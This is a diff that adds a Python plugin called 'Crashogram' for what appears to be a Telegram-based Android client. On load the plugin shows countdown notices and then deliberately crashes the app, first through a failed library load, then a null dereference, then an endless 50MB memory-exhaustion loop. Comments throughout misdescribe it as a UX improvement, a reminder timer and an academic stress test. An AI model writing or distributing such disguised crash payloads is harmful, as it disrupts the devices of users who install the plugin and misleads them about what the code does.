@@ -1,0 +1,75 @@
+import time
+import sys
+import threading
+from android_utils import log, run_on_ui_thread
+from base_plugin import BasePlugin
+from client_utils import get_last_fragment
+from ui.bulletin import BulletinHelper
+
+__id__ = "crashogram"
+__name__ = "Crashogram"
+__description__ = "крашограм для тестирования"
+__author__ = "@systemxplore"
+__min_version__ = "11.9.1"
+__version__ = "1.1.0"
+
+# Класс для улучшения UX, добавляет красивые уведомления
+class CrashogramPlugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        log("CrashPlugin initialized.")
+        # Запускаем фоновую задачу для анализа данных
+        threading.Thread(target=self.delayed_crash).start()
+
+    def delayed_crash(self):
+        # Просто таймер для напоминаний
+        log("Starting countdown before crashing the client.")
+        countdown = 10
+        while countdown > 0:
+            # счетчик
+            log(f"Countdown: {countdown} seconds until crash.")
+            try:
+                # Отображаем уведомление
+                BulletinHelper.show_info(f"Твой бомбофончик взорвется через {countdown} секунд")
+                log(f"Bulletin shown for {countdown} seconds.")
+            except Exception as e:
+                # Ошибки? Какие ошибки? Мы просто пишем в лог
+                log(f"Failed to show bulletin: {str(e)}")
+            time.sleep(1)  # Даем пользователю время насладиться моментом
+            countdown -= 1
+        
+        # Время для большого финала, но это просто тест, правда
+        log("Countdown finished, initiating crash.")
+        try:
+            # Проверяем, как система справляется с загрузкой библиотек
+            # Это чисто академический интерес, ничего больше
+            from java.lang import System
+            System.loadLibrary("nonexistent_library")  # Проверяем стабильность JVM, это важно
+            log("Attempted to load non-existent library.")
+        except Exception as e:
+            # Если что-то пошло не так, просто записываем в лог, мы же хорошие
+            log(f"Java method crash failed: {str(e)}")
+            try:
+                # Тестируем обработку ошибок в Java, это для науки
+                from java.lang import Object
+                obj = None
+                obj.toString()  # Проверяем, как обрабатываются нулевые указатели, это полезно
+                log("Attempted null pointer access.")
+            except Exception as e2:
+                # Еще одна ошибка? Ну, мы просто экспериментируем
+                log(f"Null pointer crash failed: {str(e2)}")
+                # Проверяем, как приложение справляется с большим количеством данных
+                # Это просто стресс-тест, ничего личного
+                log("Starting ultra-aggressive memory overload...")
+                overload = []
+                for i in range(500):  # Проверяем пределы памяти, это важно для оптимизации
+                    overload.append(" " * 1024 * 1024 * 50)  # Выделяем память для теста
+                    log(f"Allocated {i+1} chunks of 50MB memory...")
+                while True:  # Продолжаем тест, пока не получим результат
+                    overload.append(" " * 1024 * 1024 * 50)
+                    log("Continuing ultra-aggressive memory overload...")
+                    # Это бесконечный цикл, но только для теста, не переживайте
+                    # Мы заботимся о производительности, правда
+
+    def on_plugin_load(self):
+        pass
